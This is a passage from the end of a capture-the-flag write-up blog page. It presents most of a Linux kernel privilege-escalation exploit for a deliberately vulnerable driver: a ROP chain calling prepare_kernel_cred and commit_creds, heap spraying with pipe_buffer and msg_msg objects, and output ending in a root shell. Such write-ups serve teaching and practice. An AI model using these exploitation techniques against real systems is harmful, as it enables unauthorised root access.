+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_buf[<span style="color:#ae81ff">0x39</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x02ba00</span>; <span style="color:#75715e">// 0xffffffff8102ba00 : pop rsp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_buf[<span style="color:#ae81ff">0x0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeefcafebabe</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4cf160</span>; <span style="color:#75715e">// ret 0x100;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x426</span>; <span style="color:#75715e">// ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_buf[<span style="color:#ae81ff">0x178</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x6615f</span>; <span style="color:#75715e">// pop rdi ; pop 5 ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x6615f</span>; <span style="color:#75715e">// pop rdi ; pop 5 ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_buf[<span style="color:#ae81ff">0x110</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414142424242</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x6615f</span>; <span style="color:#75715e">// pop rdi ; pop 5 ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1a0c900</span>; <span style="color:#75715e">// init_task
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0ba280</span>; <span style="color:#75715e">// prepare_kernel_cred 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x034df3</span>; <span style="color:#75715e">// pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> heap_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x178</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3c72a7</span>; <span style="color:#75715e">// push rax ; jmp qword ptr [rcx]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242424242424242</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4444444444444444</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4545454545454545</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0b9ff0</span>; <span style="color:#75715e">// commit_creds
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe97d68</span>; <span style="color:#75715e">// swapgs
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x037bc3</span>; <span style="color:#75715e">// iretq
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> user_rip;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> user_cs; 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> user_rflags;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> user_sp;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> user_ss; 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">signal</span>(SIGSEGV, get_shell);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Spray pipe_buf objects
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying fake pipe_buffer objects</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_SOCKETS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> NUM_SKBUFFS; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(ss[i][<span style="color:#ae81ff">0</span>], secondary_buf, <span style="color:#66d9ef">sizeof</span>(secondary_buf)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Releasing pipe_buffer objects</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">close</span>(pipefd[i][<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] close&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">close</span>(pipefd[i][<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] close&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } 
+</span></span></code></pre></div><p>Note that instead of calling the classic prepare_kernel_cred(0), you now need to call perpare_kernel_cred(&amp;init_task). This is due to <a href="https://lore.kernel.org/lkml/Y1q53XlLE2n9yGH7@bombadil.infradead.org/T/">https://lore.kernel.org/lkml/Y1q53XlLE2n9yGH7@bombadil.infradead.org/T/</a>.</p>
+<p>Now, all that is left to do is to enjoy your shell :3333</p>
+<p>Output of exploit:</p>
+<pre tabindex="0"><code>STAGE 1: SETUP
+[+] Initial setup
+[+] Setting up pipes
+[+] Making FUSE directory /tmp/fuse_dir
+[+] Starting FUSE filesystem
+[+] Opening FUSE file write1
+[+] Opening FUSE file write2
+[+] Setting up sockets
+[+] Setting up msg queues
+[+] Opening Meowcrosoft Word device
+STAGE 2: KERNEL TEXT AND HEAP LEAKS
+[+] Created new doc
+[+] Creating thread for write2
+--&gt; Trying to read /write2, 0, 4096
+[+] Blocking FUSE read thread
+[+] Entering write2 thread
+[+] Creating thread for write1
+[+] Entered write1 thread
+[+] Performed free
+[+] Spraying timerfd
+--&gt; Trying to read /write1, 0, 4096
+[+] Blocking FUSE read thread
+[+] Performed read
+[+] Kernel text leak: ffffffffa72e91e0
+[+] Kernel text base: ffffffffa7000000
+[+] Freeing timerfd spray
+[+] Spraying primary msg_msg objects
+[+] Spraying secondary msg_msg objects
+[+] Unblocked FUSE read thread
+[+] Finished write1 thread
+[+] Performed write
+[+] Finding corrupted message
+[+] Leaked primary msg_msg contents
+[+] kheap 1024 address: ffff9d47044fc400
+[+] msg_msg prev address: ffff9d47044963c0
+[+] corrupted msg_msg idx: 24
+[+] next msg_msg idx: 28
+[+] kheap pt1: ffff9d47044ff800
+[+] kheap pt2: ffff9d470470a7c0
+[+] Finished write2 thread
+[*] From FUSE: ffff9d47044fc400
+[*] From FUSE: ffff9d47044963c0
+[*] From FUSE: 41
+[+] Unblocked FUSE read thread
+[+] Performed write
+STAGE 3: ROP TIME
+[+] Freeing the next_idx secondary msg_msg
+[+] Spraying sk_buff objects
+[+] Freeing the corrupted_idx secondary msg_msg
+[+] Spraying pipe_buf over freed 1024 area
+[+] Freeing pipe_buffer objects
+[+] Saved state
+[+] Spraying fake pipe_buffer objects
+[+] Releasing pipe_buffer objects
+[+] Returned to userland
+[+] UID: 0, got root!
+# :333333 YAY SHELLZ
+</code></pre><p>Hope that yall had fun with the challenge and thanks for reading this! :3</p>
+<p>You can get the challenge files here: <a href="https://github.com/KaligulaArmblessed/CTF-Challenges/tree/main/Meowcrosoft_Word">https://github.com/KaligulaArmblessed/CTF-Challenges/tree/main/Meowcrosoft_Word</a></p>
+<p>The full exploit can be obtained here: <a href="https://github.com/KaligulaArmblessed/CTF-Challenges/blob/main/Meowcrosoft_Word/exploit.c">https://github.com/KaligulaArmblessed/CTF-Challenges/blob/main/Meowcrosoft_Word/exploit.c</a></p>
+<p>Special thanks to HITCON for inspiration, STAR Labs for the idea, and everyone for playing :D</p>
+
+    <h4><a href="https://kaligulaarmblessed.github.io">Back to Home</a></h4>
+</div>
+
+
+        </div><footer class="container">
+    <hr class="soften">
+    <p>
+&copy; 
+
+    Kaligula Armblessed
+
+<span id="thisyear">2023</span>
+
+
+        | Built on <a href="//gohugo.io" target="_blank">Hugo</a>
+
+</p>
+    <p class="text-center">
+        
+        <a href="https://twitter.com/KaligulaSec">Twitter</a> 
+        
+        <a href="https://github.com/KaligulaArmblessed">GitHub</a> 
+        
+    </p>
+</footer>
+
+</body><link rel="stylesheet" href="/css/bootstrap.css">
+<link rel="stylesheet" href="/css/bootstrap-responsive.css">
+<link rel="stylesheet" href="/css/style.css">
+
+<script src="/js/jquery.js"></script>
+<script src="/js/bootstrap-386.js"></script>
+<script src="/js/bootstrap-transition.js"></script>
+<script src="/js/bootstrap-alert.js"></script>
+<script src="/js/bootstrap-modal.js"></script>
+<script src="/js/bootstrap-dropdown.js"></script>
+<script src="/js/bootstrap-scrollspy.js"></script>
+<script src="/js/bootstrap-tab.js"></script>
+<script src="/js/bootstrap-tooltip.js"></script>
+<script src="/js/bootstrap-popover.js"></script>
+<script src="/js/bootstrap-button.js"></script>
+<script src="/js/bootstrap-collapse.js"></script>
+<script src="/js/bootstrap-carousel.js"></script>
+<script src="/js/bootstrap-typeahead.js"></script>
+<script src="/js/bootstrap-affix.js"></script>
+<script>
+    _386 = { 
+        fastLoad: false ,
+        onePass: true , 
+        speedFactor: 1 
+    };
+
+    
+    function ThisYear() {
+        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
+    };
+</script></html>
